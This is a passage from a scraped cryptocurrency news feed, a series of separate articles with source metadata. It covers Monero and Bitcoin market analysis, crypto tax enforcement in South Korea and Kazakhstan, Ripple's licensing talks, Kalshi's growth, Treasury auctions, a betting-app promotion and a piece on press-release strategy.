nodes, thereby endangering privacy. The Fluorine Fermi update solves this problem by implementing an improved peer selection algorithm that reduces the chance users connect to multiple nodes within the same IP subnet, a common spy node tactic. It discourages connections to large clusters of suspicious IP addresses, steering users toward safer nodes. Another problem is that some mail carriers might get sly and try to find out who is delivering what letters. The Fluorine Fermi update changes how letters are sent and who they are sent to, which makes it extremely hard for spies to trace the trail. This helps the Monero mail service escape these cunning carriers. Meanwhile, Monero’s XMR token rose to a three-week high of $347 overnight and has since pulled back to below $340. Qubic claims 51% control of Monero hashrate In Q3, the Qubic mining pool said it took control of 51% of Monero’s hashrate. This level of control could, in theory, rewrite the chain, double-spend transactions, or censor activity, all for a cost of about $100,000 per day. A 51% attack happens when one group has more than half of a blockchain’s mining power or stake. This lets them change the chain’s history or stop transactions. At first, the pool struggled and fell to the seventh-largest on the network after a distributed denial of service (DDoS) attack on August 4, which reduced its hashrate from 2.6 gigahashes per second (GH/s) to barely 0.8 GH/s. But later, Qubic restored its power and said it was in charge of a major part of the business. Sergey Ivancheglo, the founder of Qubic, said that the plan was to take over Monero’s mining and eventually stop competitor pools from adding blocks.

Bitcoin (BTC) bounced back to around $121,500 after dipping below $120,000 late Thursday. Further gains may be difficult to achieve or could prove short-lived for two reasons. First, momentum indicators on short-term charts have turned bearish. On the hourly chart, the 50-, 100-, and 200-candle simple moving averages (SMAs) have aligned bearishly, now stacked one below the other – a classic bearish configuration. Additionally, the pattern of consecutive lower highs points to weakening buying pressure. Second, key ETFs are signaling a risk-off sentiment. The iShares iBoxx High Yield Corporate Bond ETF (HYG) has broken below its bullish trendline from May lows and slipped beneath its 50-day SMA for the first time in six months. As HYG holds high-yield (""junk"") corporate bonds, a downtrend here typically reflects rising investor aversion to risk, with investors moving away from riskier, lower-rated bonds. While BTC is often called digital gold, it has historically correlated with stocks, reflecting broader market risk sentiment. Meanwhile, in the financial sector, the Financial Select Sector SPDR Fund (XLF), which tracks major banking stocks, has lost momentum since late August and appears to be forming a rounding-top pattern suggestive of a bear market. Similarly, the regional banking ETF (KRE) has also broken below its bullish trendline established since April. Key levels BTC's bearish technical setup on short duration charts, coupled with caution in key bond and banking ETFs, indicate a market environment leaning towards risk aversion. The immediate support for BTC is seen at $120,000 followed by $118,000. A move above $124,000 would weaken the case for a deeper pullback.",Markets|Bitcoin|Markets|Cryptocurrency|market analysis|News,EN,0,0,TRADING|BTC|CRYPTOCURRENCY|MARKET|BUSINESS,"{'name': 'CoinDesk', 'img': 'https://resources.cryptocompare.com/news/5/default.png', 'lang': 'EN'}",coindesk,2025-10-10 13:19:49

At the moment, it’s around $121,639 as traders grew cautious following a key sell signal flashing on the daily chart. Overall, the trading sentiment appears to have turned bearish, as the TD Sequential indicator, historically reliable for timing corrections, has reappeared, raising fears of a potential short-term pullback. Market analyst Ali (@ali_charts) noted that similar signals earlier this year led to notable declines: A 7% dip in mid-July following the first alert. A 13% drop in mid-August after the next trigger. This pattern suggests a possible cooling phase ahead, though many traders see it as part of a larger, still-intact uptrend. Bitcoin’s overall structure remains supported by institutional inflows and strong technical foundations, with critical support zones near $122,000 and $116,700 holding firm so far. Market Psychology Mirrors Past Cycles According to trader @ KillaXBT , the emotional setup in today’s market is nearly identical to the 2022–2023 bear market bottom — only reversed. Back then, investors were afraid to buy near $16,000–$20,000. Now, that same collective psychology has flipped, as traders hesitate to sell during what could be the cycle’s euphoric peak. “The market’s only real edge is human emotion,” Killa wrote. “It doesn’t need to outsmart anyone — it just waits for you to outsmart yourself.” Unpopular Opinion $BTC The same collective psychology that drove behavior at bear market lows is playing out again, only in reverse. BTC now sits in the same emotional and structural position it did around 16 to 20K, just flipped upside down. Selling here carries the same… — Killa (@KillaXBT) October 9, 2025 That sentiment captures the paradox many investors face: fear of missing out on further gains versus fear of holding through another correction. Yet historically, such hesitation often precedes periods of volatility rather than prolonged collapse. Bitcoin Technical Setup: Triangle Nearing Resolution Bitcoin’s price action remains within a narrow band between $119,500 and $122,500, forming a short-term symmetrical triangle. The 4-hour chart highlights the 38.2% Fibonacci retracement level near $119,520 as a critical support zone, with the 50-period SMA at $122,365 providing overhead resistance. Momentum indicators suggest indecision. The RSI sits near 47, reflecting neutral sentiment, while the MACD histogram shows contracting bearish pressure. Bitcoin Price Chart – Source: Tradingview If Bitcoin rebounds from $119,500, it could reclaim $124,000 and retest $126,200, a breakout that would likely complete the Bearish Butterfly pattern highlighted in previous forecasts . However, if the $119,500–$117,400 range fails to hold, the following key levels lie at $115,400 and $112,000. The broader uptrend remains intact as long as Bitcoin trades above $115,000, supported by the rising trendline from September’s lows. BTC is in a strong ascending channel, with support at $122K and $116.7K. A breakout above $126.2K could drive a move toward $130K, completing a bearish butterfly pattern. Failure to hold $122K may trigger a pullback to $118.5K, but the broader uptrend still targets $135K into Q4. pic.twitter.com/gSlamkT4Wm — Arslan Ali (@forex_arslan) October 9, 2025 For now, Bitcoin’s consolidation looks more like preparation than exhaustion. A decisive move above $126,200 could ignite another rally toward $130,000, while institutional liquidity and ETF inflows continue to support long-term optimism heading into Q4 2025.

Meanwhile, Kazakhstan’s Financial Monitoring Agency also recently shut down 130 unlicensed crypto platforms and seized $16.7 million linked to money laundering schemes. The country is tightening AML regulations and implementing stricter verification rules for transactions as it wants to balance regulation with its goal of becoming Central Asia’s leading crypto hub. South Korea Cracks Down on Hidden Crypto South Korea’s National Tax Service (NTS) is intensifying its crackdown on crypto-related tax evasion, and warned that even assets stored in cold wallets will not be beyond the reach of tax authorities. According to a report from local outlet Hankook Ilbo, NTS officials have made it clear that if there is evidence suggesting that people are concealing cryptocurrency offline, the agency is prepared to conduct home searches and seize hard drives and cold wallet devices. (Source: The Korea Times ) This move is a much more aggressive phase in South Korea’s tax enforcement strategy as the use of digital assets becomes more widespread across the country. An NTS spokesperson stated that the agency now utilizes crypto-tracking software to analyze the coin transaction history of suspected tax delinquents. If these analyses reveal signs of offline concealment, investigators will initiate seizures under the powers granted by the National Tax Collection Act. This law allows the NTS to request information from local crypto exchanges, freeze accounts, and liquidate digital assets at market value to recover unpaid taxes. Cold wallets, which store crypto assets offline to prevent hacking and online theft, have long been favored by security-conscious investors. However, the NTS warned that this same feature can make it easier for people to hide assets and evade tax obligations. Cold vs hot wallets The agency already proved its willingness to act, as it seized and liquidated more than $108 million worth of cryptocurrency from over 14,000 people since 2021. In its first major operation in 2021, the NTS confiscated roughly $50 million from around 5,700 suspected tax evaders, and that number continued to rise in step with the nation’s growing crypto adoption. South Korea’s crypto investor base ballooned to almost 11 million people as of June 2025, which is an almost 800% increase since 2020. Trading volumes also surged from 1 trillion won (approximately $730 million) to 4.7 trillion won ($4.7 billion) over the same period. This growth coincided with a sharp rise in suspicious transaction reports (STRs) filed by virtual asset service providers (VASPs). The Financial Intelligence Unit (FIU) revealed that nearly 37,000 STRs had been submitted as of August 2025, which is more than the combined totals of the previous two years and setting a new record. Kazakhstan Seizes Millions in Crypto Kazakhstan is also stepping up its campaign against illicit activity in the cryptocurrency sector. It shut down a record number of unauthorized platforms this year while tightening anti-money laundering (AML) regulations. According to the country’s Financial Monitoring Agency (AFM), authorities dismantled 130 crypto platforms involved in money laundering operations in 2025 alone, which is a sharp increase from the 36 platforms that were taken down last year. The agency also confirmed the seizure of roughly $16.7 million in cryptocurrencies linked to illegal schemes. The AFM clarified that most of the closed platforms were not conventional centralized exchanges but unregistered “crypto exchangers” — informal operations resembling physical currency exchange offices. These illicit platforms have been a growing target for regulators as Kazakhstan works to maintain transparency in its still growing crypto ecosystem. In addition to tackling money laundering, the AFM also seized around $642,000 from illegal crypto mining operations last week. (Source: Gov.kz ) As part of its AML strategy, Kazakhstan is introducing new verification requirements for financial transactions. AFM Deputy Chairman Kairat Bizhanov announced that bank card top-ups exceeding 500,000 tenge (about $925) will now require mandatory verification of the sender’s Individual Identification Number (IIN), whereas previously only the recipient’s IIN was needed. Authorities are also considering mobile app or SMS confirmation for such transactions to improve traceability and reduce fraud. Kazakhstan wants to position itself as a leading crypto hub in Central Asia. The country already pioneered regulatory innovation by allowing the payment of government fees in stablecoins like Tether’s USDT and recently launched one of the region’s first spot Bitcoin funds. It is also developing a state-backed crypto reserve as part of its long-term strategy to integrate digital assets into the national financial system. However, it is still uncertain whether the recently seized $16.7 million in cryptocurrencies will contribute to this reserve, as the legal framework for its creation is still being finalized.",News|Crypto,EN,0,0,CRYPTOCURRENCY|REGULATION|ASIA|FIAT|BUSINESS,"{'name': 'Coinpaper', 'img': 'https://resources.cryptocompare.com/news/93/default.png', 'lang': 'EN'}",coinpaper,2025-10-10 13:30:00

52943399,603264,1760103039,https://resources.cryptocompare.com/news/13/52943399.jpeg,Ripple Execs Meet Luxembourg’s Finance Minister: A Deal In The Making?,https://bitcoinist.com/ripple-luxembourg-finance-minister/,"Ripple’s top legal and European policy leads met with Luxembourg’s Finance Minister Gilles Roth to discuss the company’s push to obtain a license in the Grand Duchy—a move that would position the US fintech to passport regulated digital-asset services across the European Union under MiCA. What Ripple’s Luxembourg Meeting Reveals After the meeting, Roth struck a decidedly welcoming tone, writing via X: “Great meeting with Ripple, as they advance toward securing their license to operate in Luxembourg. We discussed their ambitions in Europe and Luxembourg, and I reaffirmed our commitment to digital innovation.” Stuart Alderoty, Ripple’s chief legal officer, framed Luxembourg as emblematic of the EU’s first-mover regulatory posture: “The EU led in creating comprehensive rules for digital assets—and nations like Luxembourg are leaning in,” he said, thanking Roth and his team for a “great meeting last week,” and noting that Ripple is “excited about our future in Luxembourg and the EU.” The comments came as the company continues to align its product and compliance stack with Europe’s Markets in Crypto-Assets regulation , which became applicable in phases this year. Cassie Craddock, Ripple’s managing director for the UK and Europe, underscored the local opportunity created by MiCA’s roll-out: “With MiCA now rolled out across the EU, nations like Luxembourg have the opportunity to take a global lead when it comes to developing their local digital assets industry,” she wrote, calling the discussion with Roth “extremely positive” and concluding that “Luxembourg really understands the opportunity ahead,” while emphasizing Ripple “stand[s] ready to support Luxembourg’s efforts as it establishes itself at the forefront of the industry.” Luxembourg’s appeal is straightforward: it is a leading domicile for investment funds and market infrastructure in the EU, home to a sophisticated regulator (the CSSF) and a deep bench of financial-services talent. Under MiCA, a crypto-asset service provider (CASP) license obtained in one member state can be passported across the bloc, making the choice of supervisory home strategically significant. Although neither Ripple nor the Finance Ministry disclosed which precise permissions are being pursued, Roth’s characterization—“advanc[ing] toward securing their license”—suggests the firm is beyond exploratory talks and into the substantive engagement regulators require for authorization. The meeting also aligns with Ripple’s broader European push after years of US regulatory friction , where establishing a clear, MiCA-compliant footprint could de-risk client adoption of its enterprise payments and digital-asset solutions across the single market. The timing of the outreach is notable. Luxembourg has been signaling a readiness to integrate digital assets into mainstream finance. In a separate development yesterday, the country’s Intergenerational Sovereign Wealth Fund (FSIL) became the first in the Eurozone to disclose a direct sovereign allocation to spot Bitcoin ETFs —1% of its roughly $730 million portfolio—an investment Finance Minister Roth announced in the presentation of the 2026 budget. The decision followed a 2025 policy update allowing up to 15% in alternatives, including digital assets, and was structured via regulated ETF vehicles.

Soaring demand from AI and digital workloads has made grid access one of the biggest constraints on new data center growth, with interconnection timelines stretching to seven years in some regions, the broker said in a report on Friday. Miners, who secured large renewable power contracts years ago, now control more than 14 gigawatts (GW) of capacity and offer AI providers a shortcut to scale, analysts led by Gautam Chhugani wrote. Sites owned by IREN (IREN) and Riot Platforms (RIOT) can cut deployment time by up to 75% compared with greenfield projects, the analysts wrote. The sector is riding broader momentum. Bloomberg reported that Microsoft expects data center shortages to persist through 2026 as cloud and AI demand outpaces its infrastructure buildout. The surge in demand for high-performance computing is fueling optimism that bitcoin miners can capitalize by expanding into AI and data center operations. Because bitcoin facilities already run at high power densities and have advanced cooling systems, they can be retrofitted for high-performance AI workloads far faster and cheaper than new builds, Bernstein said. The broker called miners “strategic enablers” of the AI buildout and named IREN its top pick, with an outperform rating and a $75 price target. IREN was 5.7% higher in early trading Friday, around $67.50.

According to PeckShield, the theft stemmed from a private key compromise, allowing an attacker to drain the victim’s funds in a single swift move. The hack was isolated and was targeted towards the victim's wallet, not HyperLiquid itself. The stolen assets PeckShield claims included approximately 17.75 million DAI and 3.11 million MSYRUPUSDP, both of which the hacker has since bridged to Ethereum. Onchain data shows that the attacker’s wallet executed a series of transactions to move the funds through multiple addresses, a tactic commonly used to obscure traces and complicate recovery efforts. This incident highlights the persistent risk of private key exposure in decentralized systems — even as smart contract security improves, user-side vulnerabilities continue to be a major attack vector.

A record small share of the auction, only 8.7%, went to the group of 25 primary dealers that the Federal Reserve requires to take part in every auction, which is the lowest since records began in 2006, breaking the previous low of 9% reached twice in 2023, according to data from the Fed and Treasury. The auction still went through with strong interest from other players. Bloomberg Intelligence analyst Will Hoffman described demand for the sale as “solid,” which explained why primary dealers had so little awarded. The remainder of the bonds went to two other types of institutional buyers. Direct bidders placed orders straight with the Treasury Department, while indirect bidders bought through a primary dealer but did not leave the bonds in dealer accounts. Primary dealers cut participation in bond sales The pullback by dealers has been building for years. Before the 2008 financial crisis, they regularly bought more than 50% of each sale. That has collapsed across the board. Recent auctions of three-year, seven-year, and ten-year notes have also produced record lows for dealers. Analysts point to two reasons behind the drop. The first is that the size of the Treasury market has grown much faster than the dealers’ own resources, making it harder for them to hold large blocks of debt. The second is the growth of passive investment funds. These funds buy Treasuries automatically to match their indexes, cutting the role of dealers in auctions. Research by the Federal Reserve Bank of New York shows how big that passive footprint has become. In a blog post, Fed economists Michael Fleming, Jonathan Palash-Mizner, and Or Shachar said trading volume in the $30 trillion US government bond market is on average 58% higher on the last day of the month. That’s when bond indexes are rebalanced. New bonds are added, while any securities that have less than a year left to maturity are dropped. Last year’s narrower study put the spike in activity at 46% above average, but the new wider numbers show even more trading at month-end. The researchers said “the bigger numbers in this year’s broader study are important for market participants managing trade execution strategies and for policymakers monitoring market functioning and liquidity provision.” China lowers yields in post-holiday auctions While Washington was selling long bonds, China’s finance ministry was holding short-term auctions of its own. On Thursday, it priced 28-day bills at 99.925 yuan, giving an annualized yield of 0.98%. That was the lowest since January. The ministry also sold 63-day bills at a yield of 1.17%, which was also the lowest since the start of the year. Bloomberg data showed both issues attracted strong demand. Investors in China had built up cash before the Golden Week holiday earlier in October. Once markets reopened, banks quickly moved that cash into government bills. The People’s Bank of China has kept liquidity conditions anchored with moderately loose policy, leaving room for heavy buying of short-term notes. In secondary trading, yields on one-month bills also fell further, a sign that inflows continued. Longer-dated securities moved the other way, with yields rising as investors shifted out of debt and into equities. That rotation showed how appetite diverged across maturities, with short paper drawing bids and longer paper being sold.

At this point, Kalshi, the most popular prediction market platform, is also accelerating its cryptocurrency integrations. Kalshi, a US CFTC-regulated prediction platform, integrated Solana (SOL) support in May, allowing users to fund their accounts with USDC and other crypto assets, enabling a seamless transition from traditional finance to blockchain. Speaking at a Solana event, John Wang, head of cryptocurrency at Kalshi, explained why they chose Solana. John Wang said Solana was ideal for Kalshi's high-volume event contract trading needs, highlighting Solana's high-performance and low-cost trading capabilities. Wang emphasized that integrating Solana into the platform was a must-have decision for Kalshi, saying: “Integrating Solana (SOL) was definitely a decision that had to be made. Solana is practically the largest consumer-focused blockchain and has all the foundations needed for user input, such as wallet infrastructure and data. The developer environment and support has improved greatly compared to the past. Therefore, Kalshi plans to further collaborate with Solana to encourage the emergence of new prediction markets and support the developer bounty program.” *This is not investment advice.

The announcement came as the country revealed its budget report for the 2026 fiscal year. Washington imposed a 19% tariff on Malaysian goods in August as part of President Donald Trump’s ongoing tariff wars. The August levy on Malaysia exempted certain products, such as semiconductor materials, which are currently being reviewed in the U.S. Malaysia’s $114 billion budget targets growth as U.S. tariffs weigh on economy According to the latest economic outlook budget report for Malaysia’s fiscal year 2026, removing the semiconductor exemptions may result in multiple challenges for the country, including reducing its competitiveness and straining sectors closely related to U.S. supply chains. The country ranks sixth globally as a semiconductor exporter to the U.S. The country hosts multinational chip assembly and testing operations that supply most U.S. chip imports. According to a Reuters report , Malaysia’s 2026 economic outlook budget valued expenditures at $114.4 billion, a 14% increase from the 2025 revised spending. Operating expenditures received 338.2 billion ringgit, while development projects received 81 billion ringgit. Additional investments are expected from state-linked companies. Prime Minister Ibrahim Anwar has made several policy shifts since taking office, including the removal of petrol subsidies and a minimum wage hike. He said that the subsidy removal could generate annual savings of up to 15.5 billion ringgit. He noted that this year’s fuel subsidy removal has already saved 5 billion ringgit. Malaysia has reduced its fiscal deficit to 3.5% of the GDP from 3.8% this year. Anwar also highlighted a projected 2.7% rise in revenue to 343.1 billion ringgit. The 2026 budget also projected moderate inflation, at 1.3% to 2%, with monetary policy expected to support growth. Malaysia has also faced a slump in the Petroleum industry, primarily due to U.S. tariffs. Petronas, a state-owned firm, confirmed that it will pay a 20 billion ringgit dividend, marking its lowest since 2017. Malaysia’s financial report indicated that the tariffs are already weighing on its economic outlook, with projections that gross domestic product (GDP) growth could decline by 0.76 percentage points due to the new trade measures. Mealy says Washington should reconsider tariffs on Malaysian semiconductors The US-Asean Business Council warned that Washington’s imposition of tariffs on semiconductor materials could disrupt global supply chains and harm American industries. ASEAN Bernama covered the story two weeks ago, citing remarks by Marc Mealy, Executive Vice President of the US-ASEAN Business Council. Mealy acknowledged that Malaysia is crucial in the semiconductor chip supply chain globally, particularly in testing, assembly, and packaging. He added that many components pass through the country before reaching the U.S. market. President Donald Trump had proposed imposing 100% tariffs on semiconductor chips. However, Mealy argued that imposing 100% to 300% levies on semiconductor chips could lead to supply disruptions and slow vehicle and electronics production in the U.S. and beyond. The executive VC urged the Trump administration to adopt a targeted, strategic approach rather than blanket tariffs. He also noted that Malaysia’s role in global chip manufacturing makes indiscriminate measures risky for both economies. According to the ASEAN Bernama report , Malaysia supplied about 15% of the semiconductors used in the U.S. automotive sector, valued at 52.11 billion ringgit in exports last year. According to a report by the American Enterprise Institute, the U.S. imported about $40 billion worth of chips in 2024, mainly from Taiwan, Malaysia, Israel, South Korea, Ireland, Vietnam, Costa Rica, Mexico, and China.

The news highlights the rapid ascent of prediction markets from niche financial experiments to global investment-grade platforms attracting major institutional capital. Kalshi recently raised $300M+ at $5B from Sequoia, a16z, Paradigm and others. Since then, we've grown over 3x, hit $50B of annualized volume, and became the largest prediction market in the world. And today…Kalshi goes global. 140+ countries. 1 liquidity pool. pic.twitter.com/Z2myzRw9bA — Tarek Mansour (@mansourtarek_) October 10, 2025 Prediction Markets Enter the Spotlight Once a curiosity on the fringes of finance, prediction markets are now attracting millions of users wagering on everything from politics and sports to entertainment and global events. Kalshi, one of the most prominent names in the sector, said it plans to open its platform to customers in more than 140 countries, expanding far beyond its U.S. base. The company’s fundraising announcement comes the same week as Polymarket, its chief rival, revealed that Intercontinental Exchange (ICE) — parent company of the New York Stock Exchange — intends to invest up to $2 billion in its platform. Explosive Growth and Investor Backing Kalshi is also on pace to record $50 billion in annualized trading volume, a sharp increase from about $300 million last year, according to data from Dune. The platform now commands more than 60% of global prediction-market activity, recently surpassing Polymarket. “We did not expect this level of growth,” said Tarek Mansour, Kalshi’s co-founder and CEO. The surge has attracted heavyweight venture capital investors, including Sequoia Capital, Andreessen Horowitz, Paradigm, CapitalG, and Coinbase Ventures. The new round, negotiated just two months after its previous one, more than doubled Kalshi’s valuation. Sports Bets and Retail Access Drive Expansion Kalshi’s entry into sports wagering — including complex bets known as parlays — has shaken up the traditional sports betting landscape. Shares of DraftKings and FanDuel’s parent company have both declined double digits amid concerns over competition. Additionally, Kalshi’s partnerships with Robinhood and Webull have allowed users to trade prediction contracts as seamlessly as they buy stocks, deepening mainstream adoption. Regulatory Questions Loom Despite CFTC approval, Kalshi faces pushback from U.S. state regulators who argue its sports-related contracts resemble unlicensed gambling. Lawsuits have been filed in several states where online sports betting remains illegal. Mansour remains confident, saying, “Every time there’s a new type of financial innovation, there’s always a series of questions around regulation. If there weren’t questions, what you’re doing is probably not meaningful or innovative enough.” As Kalshi’s global reach expands, its battle to balance innovation with compliance may define the future of the regulated prediction market industry.

Ethereum (ETH) Ethereum closed the week with a 3% loss after buyers were unable to keep the price above $4,500. This level also acts as a key resistance. Since sellers have the upper hand, they may be able to take ETH to the key support at $4,000 before buyers decide to return and stop this correction. In the past, the $4,000 level defended the price well. Looking ahead, Ethereum needs to complete its correction before it can hope for new highs. That starts by reversing this price action and reclaiming $4,500 as support. After that, bulls can hope for $5,000 and higher highs. Ripple (XRP) XRP closed the week with a 7% loss and was overtaken by Binance Coin, which continued to make new price records. This is the first time in years since XRP lost its third position behind Ethereum. With momentum lagging, the asset continues to hover under the $3 resistance, unable to break above it. The longer this continues, the bigger the pressure on the support at $2.7. Looking ahead, XRP may fall lower in the short to medium term until it finds buyers. This is likely to happen around the $2.7 – $2.5 range. Until then, the bias is somewhat bearish on this price action. Cardano (ADA) Cardano fell by 4% this week, but managed to hold well above the key support at $0.77. As long as this level holds, buyers have a chance to take it higher later. The current resistance levels are found at $0.90 and $1. Unfortunately for the bulls, these levels rejected the price in the past as soon as they were tested. Therefore, a future breakout attempt has to be on sustained buy volume, or sellers may reject it again. Looking ahead, the ongoing consolidation above the key support may continue until buyers gather enough strength to attempt a new breakout. This could start later in October if the overall market allows it. Binance Coin (BNB) Binance Coin made a new record price this week at $1,350. This is both impressive and intimidating, considering that most altcoins have struggled to make higher highs this year. This performance has allowed BNB to close the week with a 15% price increase and also flip XRP from its third position by market capitalization. With renewed interest, liquidity has flown to the BNB ecosystem, which has flourished lately. Looking ahead, the most important target on the chart is found at $1,500. This becomes likely as soon as the bulls break the current resistance at $1,350, which is also the ATH. Should sellers return, BNB has good support at $1,200. Hype (HYPE) Hyperliquid had a disappointing week after closing with a 9% loss. This comes after renewed fears about its upcoming token unlocks. Moreover, competition from other decentralized exchanges such as Lighter and Aster has intensified. With bears in control, the price fell to $44, which is currently being tested. Should it turn into a resistance, then the asset will likely fall towards $40 next. If so, the macro uptrend may be in danger and indicate a larger correction is at hand. Looking ahead, HYPE is facing a challenging end of the year after a bullish summer that saw new price records. If buyers cannot take HYPE above $50 soon, then sellers will most likely push for lower lows.

Related Reading: XRP Fear Index Spikes To 6-Month High, And That Could Spark Its Next Breakout Nearly 60% of surveyed institutional investors say they plan to raise their crypto allocation in the next year. Average exposure is expected to double within three years, signaling firm plans rather than idle talk. Institutions Are Boosting Digital Asset Allocations Reports have disclosed that private markets are the first target. Private equity and private fixed income topped the list for tokenization, as firms look to open up illiquid holdings and make them easier to trade. By 2030, a majority of respondents expect between 10–24% of institutional investments to be made through tokenized instruments. That is a big change from pilots and proofs of concept. Our 2025 global research on #digitalassets and emerging technologies reveals a decisive shift in adoption and strategic commitment among institutional investors toward #tokenization and blockchain-enabled transformation. Read more: https://t.co/hzk1f3dZ1O pic.twitter.com/tULwI2Ke88 — State Street (@StateStreet) October 9, 2025 Benefits Cited By Investors Investors gave clear reasons for the push. Increased transparency was named by 52% as a key benefit. Faster trading was picked by 39%, and lower compliance costs by 32%. Almost half of those surveyed said they expect cost savings of more than 40% thanks to better transparency. Those figures help explain why more firms are making moves now instead of waiting. Operational Shifts Underway Based on reports, the shift is not only about portfolios. Forty percent of respondents already have a dedicated digital assets team or business unit. Nearly a third said blockchain and related digital operations are now part of their wider digital plans. Joerg Ambrosius, president of Investment Services at State Street, said institutional clients are treating these tools as strategic levers for growth and efficiency, not just experiments. Donna Milrod, chief product officer at State Street, added that firms are building teams and planning new products such as tokenized bonds, on-chain wrappers, stablecoins and tokenized cash. One in five firms plan to set up new digital asset groups in the near term. That suggests organizational change will follow the capital commitments. Many managers are rewriting workflows and adding staff with blockchain skills.

The survey covered senior executives across regions and different institution sizes, and it looked at both strategy and operational readiness.

Traditional bookmakers like Sky Bet and Bet365 dominate through deep-rooted brand recognition and long-standing user trust, while BetMGM continues to expand its UK footprint following its American success. Spartans , meanwhile, is positioning itself differently, bringing a crypto-first model with more than 5,963 games across both casino and sportsbook offerings. As betting apps compete on speed, promotions, and variety, the landscape is shifting. Players are no longer satisfied with a single feature; they demand seamless design, diverse betting markets, and faster payout systems. This comparative look explores how three established names measure up against Spartans’ crypto betting edge. Sky Bet and Its Popularity Among UK Bettors Sky Bet consistently ranks as one of the best betting apps in the UK, partly due to its accessible interface and football-focused markets. Its mobile-first design means Premier League fixtures and daily specials load almost instantly, offering a smooth experience even for novice bettors. Promotions and in-app navigation have become Sky Bet’s strongest assets. With easily accessible bet builders, prop markets, and live odds, users rarely face delays or confusion when moving between events. On the service side, Sky Bet excels with responsive customer support across multiple channels, and its payment system is straightforward for deposits and withdrawals. These qualities reinforce why the bookmaker continues to lead UK football betting, even as competition intensifies. Bet365’s Global Market Reach & BetMGM’s UK Market Push Bet365 has become nearly synonymous with British football betting, commanding one of the largest user bases in the world. Its app, launched in 2012, remains highly trusted, with over 5 million downloads on the Google Play Store alone. Known for its wide market selection, Bet365 provides odds for everything from the Premier League to international women’s football and smaller club competitions. Live streaming is a standout feature, with coverage extending beyond football to tennis, horse racing, and golf. This real-time content, paired with the platform’s “Bet Builder,” allows punters to customize wagers across multiple markets with ease. On the other hand, while BetMGM is a newer entrant to the UK betting scene, it has quickly established itself with an attractive welcome offer of “Get £40 in free bets when you bet £10.” Tailored for Premier League fans, its interface highlights trending bet builders, moneyline wagers, and enhanced odds on clubs it sponsors. The app mirrors the US model by emphasizing promotions such as “Golden Goals,” where bettors can win up to £1 million by predicting correct scores. Its intuitive design also makes it beginner-friendly, with clear layouts and simplified access to bet types. Spartans’ 3,963+ Game Library & Crypto-First Betting Model Unlike its competitors, Spartans positions itself as an all-in-one casino and sportsbook built for crypto users. Instead of traditional payment methods, it supports leading cryptocurrencies such as Bitcoin (BTC), Ethereum (ETH), Tether (USDT), USD Coin (USDC), Avalanche (AVAX), and more. The advantage is instant deposits, low fees, and borderless transactions without the risk of card declines or bank restrictions. Spartans’ standout figure is its 5,963+ game library, spanning slots, blackjack, roulette, baccarat, crash games, and live game show-style formats. This extensive offering competes with platforms like Roobet while also incorporating a sportsbook with global coverage from football and basketball to UFC and esports. By consolidating casino and sports betting under one account, Spartans removes the need for multiple apps. The platform also appeals through its 25% daily deposit casino bonus, designed for consistent engagement rather than a one-time welcome incentive. With wagering requirements and bonus terms clearly outlined, Spartans aligns with the transparent reward systems seen in newer crypto casinos. Another unique aspect is its multilingual support and plans for expanding payment methods beyond crypto, suggesting it is building toward mainstream adoption while retaining blockchain-native advantages. Closing Analysis Sky Bet, Bet365, and BetMGM continue to define much of the traditional betting experience with extensive markets, promotional offers, and long-standing trust in regulated markets. Each appeals to a different type of bettor, from Sky Bet’s daily bonuses to Bet365’s global live streaming coverage and BetMGM’s aggressive UK promotions. Spartans, however, introduces a new dimension by combining both casino and sportsbook experiences into a crypto-first betting platform. With over 5,963 games, fast blockchain transactions, and flexible bonus structures, it addresses demands for variety, speed, and borderless accessibility. As crypto betting gains momentum, Spartans represents an emerging competitor positioned to sit alongside the best betting apps in this fast-changing landscape.

52944813,https://cryptodaily.co.uk/2025/10/what-is-the-new-role-of-press-release-campaigns-and-why-theyre-still-important,1760105076,https://resources.cryptocompare.com/news/75/52944813.jpeg,What is the New Role of Press Release Campaigns and Why They're Still Important?,https://cryptodaily.co.uk/2025/10/what-is-the-new-role-of-press-release-campaigns-and-why-theyre-still-important,"Twenty or thirty years ago, press releases were the backbone of public relations. The process was simple: when something happens, you draft a release, send it to journalists, and often they'd build a full story around it. Back then, information flows were manageable, audiences less picky, and a well-timed press release could genuinely shape coverage. That world doesn't exist anymore. Today, readers are bombarded with endless information and skim far more selectively. Media sections dedicated to press releases attract little to no organic traffic. The format has largely shifted from being a journalist's raw material to a sponsored post category, clearly marked with ""advertisement"" or ""sponsored"" tags. As a result, the limited use of press releases today reflects a fundamental transformation. It's no longer the main driver of visibility, but a tool with very specific, limited use cases. Modern PR has steadily moved toward organic strategies – securing earned coverage, expert commentary, and analysis – because these approaches build more trust and deliver more lasting results. However, that doesn't mean press releases are obsolete. They still have value, but only when deployed with a clear purpose and as part of a broader communication system. From Magic Bullet to Strategic Tool One persistent myth is that a single press release can make a project ""famous overnight."" Founders often expect that publication will bring instant fame, investor interest, and adoption. The reality is very different. Press releases are not magic bullets that deliver meaningful visibility or leads on their own. Part of the problem is confusion: some even equate ""PR"" with ""press releases"" themselves. While press releases are one tool in the PR toolbox, they're far from the whole system. At best, they provide a formal record of a company milestone. At worst, they disappear into low-traffic sections of news sites that few real readers ever visit. When Press Releases Actually Work Despite their diminished role, do press releases still work? Yes, but only in specific scenarios: Activating news triggers – When a project hits a milestone and needs an official statement of record, a press release sets the foundation for later organic coverage. It marks that something newsworthy happened. Financial disclosures and regulatory compliance – Public companies are legally obligated to announce material information through authenticated wire services. Press releases serve as the official record. Crisis communication – During data breaches, product recalls, or executive misconduct, press releases establish organizations as trustworthy information sources when immediate response is critical. SEO and link building – Wire distribution that places releases across multiple sites can support search rankings through backlink authority at scale, even if those placements generate minimal direct readership. Partnership and integration announcements – Exchange listings, protocol collaborations, and major integrations tap into partner ecosystems and can generate tangible traction and visibility. Research and thought leadership – Publishing market insights, user data, or industry reports positions projects as credible voices while attracting journalist attention and inbound interest. The Integrated Approach Modern best practice treats press releases as one component within multi-channel campaigns rather than standalone tactics. Press releases now serve as the ""source of truth"" and foundation for content ecosystems that include blog posts, social media, email marketing, and targeted journalist outreach. The economics tell the story: national press release distribution costs $800-$3,000 per release, yet direct comparison studies show blog posts generate approximately double the traffic and social shares. Meanwhile, 96% of PR professionals say individual emails are the most effective channel for pitching journalists, while only 13% consider newswire services effective. This explains why earned media is more important than ever, with brands shifting toward thought leadership and expert commentary that build trust and deliver lasting results. Research shows 73% of decision-makers trust thought leadership content more than traditional PR materials. Image Tool, Not Lead Generation Engine Understanding the modern role of a press release means recognizing it as an image tool, not a reliable source of leads. Their strength lies in establishing legitimacy – putting an official statement on record, anchoring a milestone, or giving stakeholders something they can reference. 